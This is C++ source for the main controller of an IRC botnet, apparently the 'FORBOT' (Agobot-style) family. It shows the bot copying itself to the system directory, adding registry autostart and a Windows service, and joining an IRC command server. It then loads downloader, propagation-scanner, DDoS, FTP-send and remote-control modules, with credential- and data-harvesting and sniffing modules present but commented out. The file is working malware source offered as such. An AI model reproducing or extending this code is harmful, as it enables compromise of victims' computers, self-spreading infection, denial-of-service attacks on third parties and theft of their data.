#include "main.h"
#include "mainctrl.h"

CMainCtrl g_cMainCtrl;

int CMainCtrl::MainCtrl()
{
	#ifdef DBGCONSOLE
		m_cConsDbg.Log(1, "[FORBOT] Started MainCtrl\n");
		m_cConsDbg.Log(1, "Connecting to: %s\n", m_cBot.si_server.sValue.CStr());
	#endif

	bool bFailed=false; 
	m_bRunning=true; 
	while(m_bRunning && !bFailed)
	{
		if(!m_cIRC.m_bRunning) bFailed=true;
		if(!bFailed) bFailed=!m_cBot.Think();
		if(bFailed) m_bRunning=false;
		list<CThread*>::iterator it; 
		for(it=m_lCanJoin.begin(); 
		it!=m_lCanJoin.end(); ++it) {
			(*it)->Kill(); delete(*it); 
		} 
		m_lCanJoin.clear();
		Sleep(250); 
	}
	if(bFailed) return 1; 
	else return 0; 
}

int CMainCtrl::Main(const char *szCmdLine, const char *szArgv0){
	m_bRunning=true;
	g_cMainCtrl.m_lCanJoin.clear();
	if(szArgv0) m_sArgv0.Assign(szArgv0); 
	else m_sArgv0.Assign("");
	if(szCmdLine) m_sCmdLine.Assign(szCmdLine); 
	else m_sCmdLine.Assign("");
	m_cCmdLine.Parse(szCmdLine);
	if(m_cCmdLine.m_cConfig.bDebug) m_cConsDbg.Init(m_cCmdLine.m_cConfig.iDebugLevel);
	#ifdef DBGCONSOLE
		m_cConsDbg.Log(5, "Command line: \"%s\"...\n", szCmdLine);
	#endif
	#ifdef WIN32
		#ifdef DBGCONSOLE
			m_cConsDbg.Log(5, "Starting WinSock...\n");
		#endif
		WSADATA wsaData; WSAStartup(MAKEWORD(2,2), &wsaData);
	#endif
	CThread::InitPThreads();
	m_cCVar.Init();
	m_cMac.Init();
	m_cBot.Init();	
	Sleep(1000);
	m_cBot.Config();
	Sleep(1000);
	#ifdef WIN32
		if(m_cCmdLine.m_cConfig.bService || m_cBot.as_service.bValue) 
		{
			#ifdef DBGCONSOLE
				m_cConsDbg.Log(5, "Starting service thread...\n");
			#endif
			#ifndef DBGCONSOLE
				m_cService.Start();
			#endif
		}
	#endif
	Sleep(1000);
	m_cInstaller.CopyToSysDir(m_cBot.bot_filename.sValue);
	m_cInstaller.Install();
	#ifdef WIN32
		if(m_cBot.as_enabled.bValue)
		{
			#ifdef DBGCONSOLE
				m_cConsDbg.Log(5, "Adding registry autostart...\n");
			#endif
			#ifndef DBGCONSOLE
				m_cInstaller.RegStartAdd(m_cBot.as_valname.sValue, m_cBot.bot_filename.sValue);
			#endif
		}
		if(m_cBot.as_service.bValue && !m_cInstaller.IsInstalled(m_cBot.as_service_name.sValue)) 
		{
			#ifdef DBGCONSOLE
				m_cConsDbg.Log(5, "Adding service...\n");
			#endif
			#ifndef DBGCONSOLE
				m_cInstaller.ServiceAdd(m_cBot.as_service_name.sValue, m_cBot.bot_filename.sValue);
			#endif
		} else {
			m_cInstaller.ServiceDel(m_cBot.as_service_name.sValue);
		}	
		if(m_cBot.as_service.bValue && !m_cCmdLine.m_cConfig.bService) 
		{
			#ifdef DBGCONSOLE
				m_cConsDbg.Log(5, "Starting service...\n");
			#endif
			#ifndef DBGCONSOLE
				if(m_cInstaller.ServiceStart(m_cBot.as_service_name.sValue)) 
				{
					exit(0);
				} 
			#endif
		}
	#endif
	#ifdef DBGCONSOLE
		m_cConsDbg.Log(7, "Initializing RNG...\n");
	#endif
	init_random();
	m_sUserName=RndNick(m_cBot.si_nickprefix.sValue.CStr());
	#ifdef DBGCONSOLE
		m_cConsDbg.Log(5, "Starting threads...\n");
	#endif
	 m_cIRC.Start();
//	 m_cSendFile.Start();
	 m_cSendFileFTP.Start();

	#ifdef DBGCONSOLE
		m_cConsDbg.Log(5, "Initializing subsystems...\n");
	#endif
	// Initialize subsystems
	#ifdef DBGCONSOLE
		g_cMainCtrl.m_cConsDbg.Log(1, "Loading Modules\n");
	#endif
	m_cDownloader.Init();
//	m_cScanner.Init();
	m_cAdvScan.Init();
	m_cDDOS.Init();
	//m_cHarvest_EMails.Init();
	//m_cRedirect.Init();
	//m_cHarvest_Registry.Init();
//	m_cScannerAuto.Init();
	m_cIRC.Init();
	m_cProcessControl.Init();
	m_cInstaller.Init();
//	m_cHarvest_CDKeys.Init();
//	m_cSpeedTest.Init();
///	m_cPsniff.Init();
//	m_cSSniff.Start();
//	m_cSnap.Init();
	m_cRSLControl.Init();
	m_cLogic.Init();
	m_cPortCheck.Init();
//	m_cFindFile.Init();
//	m_cDccCommand.Init();

//	m_cPortScan.Init();
	#ifdef DBGCONSOLE
		g_cMainCtrl.m_cConsDbg.Log(1, "Loaded Modules\n");
	#endif

	// Start the main loop
	#ifdef DBGCONSOLE
		m_cConsDbg.Log(7, "Starting the main loop...\n");
	#endif


	int iRetVal=MainCtrl();

	#ifdef DBGCONSOLE
		m_cConsDbg.Log(7, "Terminated the main loop...\n");
	#endif
//	m_cIdentD.Kill(); 
//	m_cSendFile.Kill();
	m_cIRC.Kill(); // m_cService.Kill();

	// Cleanup pthreads
	CThread::CleanupPThreads();

	#ifdef WIN32
		#ifdef DBGCONSOLE
			m_cConsDbg.Log(5, "Shutting down WinSock...\n");
		#endif
		WSACleanup();
	#endif

	// Deactivate debugging console
	if(m_cCmdLine.m_cConfig.bDebug) {
		#ifdef WIN32
			//system("pause");
		#endif // WIN32
		m_cConsDbg.DeInit();
	}
//	m_autoCmd.Start();
	return iRetVal; 
}

void CMainCtrl::RegisterService() 
{
	#ifdef WIN32 
	#endif
}

// Platform compatibility hacks
#ifdef WIN32
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hprev, PSTR cmdline, int ishow)
{	
	return g_cMainCtrl.Main(cmdline, NULL); 
}
#endif
